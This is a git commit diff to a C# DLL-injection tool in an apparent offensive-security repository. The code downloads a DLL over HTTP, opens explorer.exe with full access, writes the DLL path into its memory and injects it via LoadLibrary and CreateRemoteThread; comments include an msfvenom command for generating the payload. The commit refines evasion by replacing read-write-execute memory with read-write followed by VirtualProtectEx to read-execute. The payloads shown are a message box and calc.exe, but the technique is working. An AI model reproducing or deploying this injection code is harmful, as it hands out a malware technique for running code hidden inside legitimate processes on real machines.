6384a44fa67e4e3c915b44f9b13e7a2d17dd5718
ChristianWeiler <46946556+ChristianWeiler@users.noreply.github.com>
2021-06-05 01:54:21 +0000

    Update dll.cs

--- process_injection/dll/dll.cs
+++ process_injection/dll/dll.cs
@@ -18,6 +18,9 @@ namespace Inject
         static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
+        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
@@ -31,11 +34,11 @@ namespace Inject
         {
             //Download DLL to the MyDocuments folder
             String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
-            String dllName = dir + "\\alert.dll";
+            String dllName = dir + "\\calc.dll";
             WebClient wc = new WebClient();
 
-            // msfvenom -p windows/x64/messagebox TEXT="PWND" -f dll -o alert.dll
-            wc.DownloadFile("http://127.0.0.1/alert.dll", dllName);
+            // msfvenom -p windows/x64/exec cmd=calc.exe -f dll -o calc.dll
+            wc.DownloadFile("http://127.0.0.1/calc.dll", dllName);
 
             //Find all processes with the name explorer and get the PID of the 1st
             Process[] expProc = Process.GetProcessesByName("explorer");
@@ -46,11 +49,17 @@ namespace Inject
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
 
             //Allocate memory in remote process to copy bytes to
-            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
+            // MEM_COMMIT + MEM_RESERVE = 0x3000
+            // PAGE_READWRITE = 0x04
+            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x04);
 
             //Write buffer to allocated memory
             IntPtr outSize;
             Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
+
+            uint oldProtect = 0;
+            // PAGE_EXECUTE_READ = 0x20
+            VirtualProtectEx(hProcess, addr, 0x1000, 0x20, out oldProtect);
 
             //Resolve address of LoadLibrary in remote process
             //Windows DLLs are allocated at the same base address across process
